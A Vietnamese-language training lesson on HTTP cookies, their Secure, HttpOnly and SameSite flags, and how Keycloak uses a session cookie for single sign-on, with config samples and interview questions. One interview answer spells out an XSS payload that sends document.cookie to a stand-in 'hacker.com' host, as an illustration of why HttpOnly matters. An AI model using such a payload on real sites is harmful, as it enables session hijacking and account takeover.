# Lesson 3: Cookies

> [!NOTE]
> **Category:** Theory (Lý thuyết)
> **Goal:** Hiểu sâu sắc cơ chế hoạt động của Cookie, các cờ (flags) bảo mật thiết yếu và vai trò quyết định của Cookie trong việc duy trì phiên đăng nhập dùng chung (SSO) trên hệ thống Keycloak.

## 1. Lý thuyết chuyên sâu (Detailed Theory)

### 1.1. Bản chất của Cookie
Vì HTTP là giao thức không trạng thái (stateless), máy chủ web cần một giải pháp cơ sở để "ghi nhớ" người dùng giữa các lần nhấp chuột (clicks). **Cookie** chính là giải pháp nguyên thủy và phổ biến nhất. 

Cookie là những mẩu dữ liệu nhỏ (kích thước tối đa thường là 4KB) được lưu trữ trực tiếp dưới dạng cặp `Key=Value` trong cơ sở dữ liệu nội bộ của trình duyệt web (Browser). Bất cứ khi nào trình duyệt gửi một `HTTP Request` đến máy chủ đã cấp phát Cookie đó, nó sẽ tự động đính kèm Cookie này vào `Request`.

### 1.2. Vai trò của Cookie trong Keycloak (Identity Provider)
Khi người dùng đăng nhập thành công vào Keycloak thông qua trình duyệt, Keycloak không chỉ trả về các Token (Access Token, ID Token) cho ứng dụng (Client), mà hệ thống Keycloak còn lén đặt một **Session Cookie** (thường mang tên `KEYCLOAK_IDENTITY` hoặc `KEYCLOAK_SESSION`) vào chính trình duyệt của người dùng.
- Lần tới, khi người dùng truy cập một ứng dụng khác (Client 2) và bị chuyển hướng (Redirect) về lại Keycloak để xác thực, trình duyệt sẽ tự động gửi kèm cái Cookie `KEYCLOAK_IDENTITY` này. 
- Keycloak đọc Cookie, nhận ra người dùng đã đăng nhập trước đó, và tự động cấp phép cho Client 2 mà không bắt người dùng nhập lại Password. Đây chính là cơ chế cốt lõi của **Single Sign-On (SSO)** trên nền tảng Web.

---

## 2. Luồng nội bộ & Cơ chế cấp thấp (Internal Workflow & Low-level Mechanisms)

Quá trình trao đổi và lưu trữ Cookie diễn ra ở tầng HTTP Headers, hoàn toàn trong suốt với mã JavaScript của ứng dụng Frontend.

```mermaid
sequenceDiagram
    autonumber
    participant Browser as Trình duyệt (Người dùng)
    participant Server as Máy chủ (Keycloak)

    Note over Browser: Truy cập trang quản trị
    Browser->>Server: GET /auth/admin HTTP/1.1
    Server-->>Browser: HTTP 401 Unauthorized (Yêu cầu đăng nhập)
    
    Browser->>Server: POST /login (Username: admin, Pass: 123)
    Note over Server: Kiểm tra DB, mật khẩu đúng. <br/>Tạo phiên làm việc nội bộ.
    
    Server-->>Browser: HTTP 302 Found (Redirect)<br/>Set-Cookie: KEYCLOAK_IDENTITY=abc_123_xyz; HttpOnly; Secure; SameSite=Lax
    
    Note over Browser: Trình duyệt phân tích Header 'Set-Cookie',<br/>lưu trữ 'abc_123_xyz' vào ổ cứng.
    
    Browser->>Server: GET /auth/admin/dashboard<br/>Cookie: KEYCLOAK_IDENTITY=abc_123_xyz
    Note over Server: Nhận được Cookie, trích xuất ID,<br/>cấp quyền truy cập Dashboard.
    
    Server-->>Browser: HTTP 200 OK (Dashboard HTML)
```

---

## 3. Thực hành tốt nhất & Bảo mật (Best Practices & Security)

> [!CAUTION]
> **Rủi ro XSS (Cross-Site Scripting)**
> Nếu Cookie chứa thông tin nhạy cảm (như Session ID) mà không có cờ `HttpOnly`, bất kỳ mã JavaScript độc hại nào bị chèn vào trang web (thông qua lỗi XSS) đều có thể lấy cắp Cookie này bằng lệnh `document.cookie` và gửi về máy chủ của Hacker. Khi Hacker có Cookie, họ có thể chiếm đoạt hoàn toàn tài khoản (Session Hijacking).

> [!IMPORTANT]
> **Bộ 3 Cờ Bảo mật (Security Flags) Bắt buộc**
> Để một Cookie được coi là an toàn cấp Enterprise, máy chủ khi phát hành Cookie (qua lệnh `Set-Cookie`) PHẢI đính kèm 3 cờ sau:
> 1. **`Secure`**: Chỉ thị trình duyệt CHỈ được gửi Cookie này khi kết nối qua HTTPS. Nếu kết nối tụt xuống HTTP, Cookie bị giữ lại.
> 2. **`HttpOnly`**: Cấm mã JavaScript đọc hoặc tương tác với Cookie. Khóa chặt hoàn toàn rủi ro bị đánh cắp qua XSS.
> 3. **`SameSite`**: Ngăn chặn Cookie bị gửi đi trong các Request chéo trang (Cross-site Request), là khiên chắn chính chống lại tấn công CSRF. Thường đặt là `Lax` hoặc `Strict`.

---

## 4. Cấu hình minh họa thực tế (Configuration Examples)

Ví dụ minh họa cấu hình trong Spring Boot (đóng vai trò là Resource Server tự quản lý session) để đảm bảo mọi Cookie sinh ra đều tuân thủ bộ 3 cờ bảo mật:

```yaml
# application.yml trong Spring Boot
server:
  servlet:
    session:
      cookie:
        secure: true      # Chỉ gửi qua HTTPS
        http-only: true   # Chống XSS
        same-site: lax    # Chống CSRF ở mức độ cân bằng UX
```

Cấu hình cưỡng ép Cookie an toàn bằng Nginx (Trường hợp Backend cũ không hỗ trợ gắn cờ):
```nginx
# Thêm cờ Secure và HttpOnly vào mọi Header Set-Cookie đi ngang qua Proxy
proxy_cookie_path / "/; HTTPOnly; Secure";
```

---

## 5. Trường hợp ngoại lệ (Edge Cases)

- **Third-Party Cookies bị chặn ngầm (ITP / Privacy Sandbox):** Safari (của Apple) và trình duyệt Brave mặc định chặn hoàn toàn các "Cookie bên thứ ba" (Third-Party Cookies). 
  - **Kịch bản:** Trang web của bạn chạy trên `app.com`. Mã JavaScript trên trang tạo một `iframe` ẩn (ẩn danh) gọi sang `auth.keycloak.com` để làm mới token (Silent Refresh).
  - **Lỗi xảy ra:** Trình duyệt nhận định lệnh gọi iframe này là Cross-site, nên nó **không đính kèm Cookie** của `auth.keycloak.com`. Keycloak tưởng người dùng chưa đăng nhập và báo lỗi `login_required`. Tính năng Silent Auth gãy hoàn toàn.
  - **Khắc phục:** Sử dụng Custom Domain cho Keycloak (đưa Keycloak về chung Root Domain với ứng dụng, ví dụ `auth.app.com` và `www.app.com`) để Cookie trở thành First-Party.

---

## 6. Câu hỏi Phỏng vấn (Interview Questions)

**1. Giải thích ngắn gọn cơ chế hoạt động của Cookie?**
- **Junior:** Cookie là file nhỏ lưu trên máy tính. Lúc đăng nhập xong, web lưu mã vào đó. Lúc sau vào lại web thì trình duyệt tự gửi mã đó lên server để khỏi đăng nhập lại.
- **Senior:** Cookie là cơ chế lưu trữ trạng thái ở Client. Server khởi tạo Cookie qua HTTP Response Header `Set-Cookie`. Browser lưu trữ cặp Key-Value này cùng với metadata (như Domain, Path, Expiration). Trong các HTTP Request tiếp theo hướng về Domain khớp với metadata, Browser sẽ tự động (automatically) chèn cặp Key-Value vào Header `Cookie`. Nó đóng vai trò như một phương tiện vận chuyển trạng thái qua một giao thức không trạng thái (HTTP).

**2. Tại sao một Cookie chứa `Access Token` lại là một thiết kế tồi nếu không có `HttpOnly`?**
- **Junior:** Vì hacker dùng JavaScript có thể ăn trộm Token đó và đăng nhập bằng tài khoản của mình.
- **Senior:** Việc phơi bày `Access Token` hoặc `Session ID` trong Cookie mà không có cờ `HttpOnly` mở ra lỗ hổng bảo mật nghiêm trọng liên quan đến XSS (Cross-Site Scripting). Kẻ tấn công chỉ cần tìm được một input field không chặn script, chèn lệnh `<script>fetch('hacker.com?c='+document.cookie)</script>`. Khi nạn nhân truy cập, Token sẽ bị đánh cắp tức thì. Cờ `HttpOnly` đẩy Cookie hoàn toàn xuống tầng Network của trình duyệt, cách ly hoàn toàn khỏi môi trường thực thi của DOM và JavaScript Engine.

**3. Làm thế nào để xóa một Cookie từ phía máy chủ (Server-side)?**
- **Junior:** Server gọi hàm xóa Cookie để báo trình duyệt xóa đi.
- **Senior:** Server không thể "xóa" file trên máy Client. Để vô hiệu hóa một Cookie, Server phải gửi một Header `Set-Cookie` trùng chính xác tên (Key), Domain, và Path với Cookie cũ, nhưng nội dung (Value) bị làm rỗng, và đặc biệt là set thời hạn `Expires` lùi về quá khứ (ví dụ: `Thu, 01 Jan 1970 00:00:00 GMT`) hoặc `Max-Age=0`. Khi nhận được lệnh này, cơ chế dọn dẹp của trình duyệt sẽ tự động hủy Cookie đó vì nó đã hết hạn.

**4. Phân biệt cờ `SameSite=Strict` và `SameSite=Lax`? Đối với hệ thống OIDC, bạn dùng loại nào?**
- **Junior:** `Strict` thì an toàn hơn, `Lax` thì nới lỏng hơn. Nên dùng `Lax` để ít bị lỗi.
- **Senior:** `SameSite=Strict` cấm tuyệt đối việc gửi Cookie trong TẤT CẢ các request chéo trang, kể cả khi người dùng click vào một link từ trang ngoài dẫn vào trang của bạn (Top-level navigation). `SameSite=Lax` an toàn tương đương đối với các request ngầm (như AJAX, hình ảnh, POST form), nhưng nó cho phép gửi Cookie nếu đó là thao tác click link điều hướng cấp cao nhất an toàn (GET). Đối với OIDC/Keycloak, ta KHÔNG THỂ dùng `Strict` cho Session Cookie, vì sau khi người dùng đăng nhập tại Keycloak và bị Redirect (302) về lại ứng dụng, Request đó là Cross-site. Nếu dùng `Strict`, Cookie bị rớt, Session không được thiết lập. Ta bắt buộc dùng `Lax`, hoặc `None` (đi kèm `Secure`) nếu phải hỗ trợ iframe.

**5. Cookie có bị giới hạn dung lượng không? Nếu bạn nhét toàn bộ quyền hạn (Roles/Groups) của User vào Cookie thì sao?**
- **Junior:** Có, Cookie chỉ lưu được vài kilobyte. Nhét nhiều quá sẽ bị lỗi trình duyệt.
- **Senior:** Trình duyệt áp đặt mức trần dung lượng gắt gao cho mỗi Cookie (thường là 4KB) và giới hạn tổng số lượng Cookie trên mỗi Domain. Nếu ta cố gắng nhồi nhét hàng chục Roles/Groups vào một JWT và lưu vào Cookie, dung lượng sẽ vượt ngưỡng 4KB. Hậu quả là trình duyệt sẽ từ chối lưu Cookie mới một cách im lặng (silent fail), hoặc máy chủ Web (như Nginx) sẽ ném ra lỗi `431 Request Header Fields Too Large` khi nhận Request. Phương pháp đúng đắn là chỉ lưu một `Session ID` ngắn hoặc Reference Token trong Cookie, mọi dữ liệu lớn phải nằm ở Server-side.

---

## 7. Tài liệu tham khảo (References)
- **RFC 6265:** HTTP State Management Mechanism. (https://datatracker.ietf.org/doc/html/rfc6265)
- **MDN Web Docs:** Set-Cookie. (https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- **OWASP:** Session Management Cheat Sheet.
